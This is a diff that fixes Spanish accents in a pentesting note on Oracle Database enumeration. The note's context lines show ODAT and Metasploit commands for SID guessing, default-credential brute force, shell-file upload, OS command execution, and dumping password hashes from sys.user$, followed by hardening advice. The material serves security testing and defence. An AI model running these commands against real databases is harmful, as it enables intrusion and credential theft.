@@ -1,7 +1,7 @@
 # Enumeración Oracle Database
 
 ## Descripción
-Oracle Database es un sistema de gestión de bases de datos relacional empresarial que opera en el puerto 1521/tcp (TNS Listener). La enumeración de Oracle incluye: identificar la versión del TNS Listener y sus componentes, descubrir SIDs (System Identifiers) e instancias de la base de datos, realizar fuerza bruta de credenciales (especialmente cuentas por defecto como SYS, SYSTEM, SCOTT, DBSNMP), y con acceso, extraer hashes de contraseñas, tablas y datos sensibles. Oracle tiene una superficie de ataque amplia debido a sus cuentas por defecto, procedimientos PL/SQL con privilegios elevados, y la posibilidad de ejecutar comandos del sistema operativo a traves de Java o paquetes como DBMS_SCHEDULER.
+Oracle Database es un sistema de gestión de bases de datos relacional empresarial que opera en el puerto 1521/tcp (TNS Listener). La enumeración de Oracle incluye: identificar la versión del TNS Listener y sus componentes, descubrir SIDs (System Identifiers) e instancias de la base de datos, realizar fuerza bruta de credenciales (especialmente cuentas por defecto como SYS, SYSTEM, SCOTT, DBSNMP), y con acceso, extraer hashes de contraseñas, tablas y datos sensibles. Oracle tiene una superficie de ataque amplia debido a sus cuentas por defecto, procedimientos PL/SQL con privilegios elevados, y la posibilidad de ejecutar comandos del sistema operativo a través de Java o paquetes como DBMS_SCHEDULER.
 
 ## Clasificación
 - **Fase**: Enumeración
@@ -56,11 +56,11 @@ tnscmd10g services -h <target> -p 1521
 
 ### Enumeración con ODAT (Oracle Database Attacking Tool)
 ```bash
-# Obtener toda la informacion disponible del listener
+# Obtener toda la información disponible del listener
 odat tnscmd -s <target> -p 1521 --version
 odat tnscmd -s <target> -p 1521 --status
 
-# Descubrir SIDs validos
+# Descubrir SIDs válidos
 odat sidguesser -s <target> -p 1521
 # Usa diccionario interno de SIDs comunes (XE, ORCL, PROD, DEV, TEST, etc.)
 
@@ -79,11 +79,11 @@ odat ctxsys -s <target> -p 1521 -d XE -U scott -P tiger \
 odat dbmsadvisor -s <target> -p 1521 -d XE -U scott -P tiger \
   --putFile /tmp shell.txt /ruta/local/shell.txt
 
-# Ejecucion de comandos del SO
+# Ejecución de comandos del SO
 odat externaltable -s <target> -p 1521 -d XE -U scott -P tiger \
   --exec /bin/bash "id"
 
-# Ejecucion de comandos via Java (requiere privilegios CREATE PROCEDURE + Java)
+# Ejecución de comandos vía Java (requiere privilegios CREATE PROCEDURE + Java)
 odat java -s <target> -p 1521 -d XE -U scott -P tiger \
   --exec "whoami"
 ```
@@ -99,7 +99,7 @@ run
 use auxiliary/scanner/oracle/sid_brute
 set RHOSTS <target>
 run
-# Resultado: SIDs validos encontrados
+# Resultado: SIDs válidos encontrados
 
 # Fuerza bruta de credenciales
 use auxiliary/scanner/oracle/oracle_login
@@ -115,14 +115,14 @@ run
 # Conectar como usuario normal
 sqlplus scott/tiger@<target>:1521/XE
 
-# Conectar como SYSDBA (maximo privilegio)
+# Conectar como SYSDBA (máximo privilegio)
 sqlplus sys/password@<target>:1521/XE as sysdba
 
-# Consultas de enumeracion dentro de Oracle:
+# Consultas de enumeración dentro de Oracle:
 SELECT * FROM v$version;                          -- version de Oracle
 SELECT username FROM all_users;                    -- usuarios de la BD
 SELECT username, account_status FROM dba_users;    -- estado de cuentas
-SELECT name, password FROM sys.user$;              -- hashes de contrasenas
+SELECT name, password FROM sys.user$;              -- hashes de contraseñas
 SELECT table_name FROM all_tables WHERE owner='HR'; -- tablas de un esquema
 SELECT * FROM dba_role_privs WHERE grantee='SCOTT'; -- roles asignados
 SELECT * FROM session_privs;                        -- privilegios de sesion actual
@@ -143,8 +143,8 @@ SELECT * FROM session_privs;                        -- privilegios de sesion act
 - No exponer el puerto 1521 a internet; restringirlo a IPs de aplicación autorizadas
 - Revocar privilegios innecesarios: CREATE PROCEDURE, CREATE LIBRARY, Java permissions
 - Deshabilitar DBMS_SCHEDULER y paquetes de ejecución de comandos si no son necesarios
-- Aplicar principio de minimo privilegio: no usar cuentas con rol DBA para aplicaciones
-- Mantener Oracle Database actualizado con los ultimos Critical Patch Updates (CPU)
+- Aplicar principio de mínimo privilegio: no usar cuentas con rol DBA para aplicaciones
+- Mantener Oracle Database actualizado con los últimos Critical Patch Updates (CPU)
 - Configurar Oracle Audit Vault o activar auditing para monitorear accesos sospechosos
 
 ## Referencias
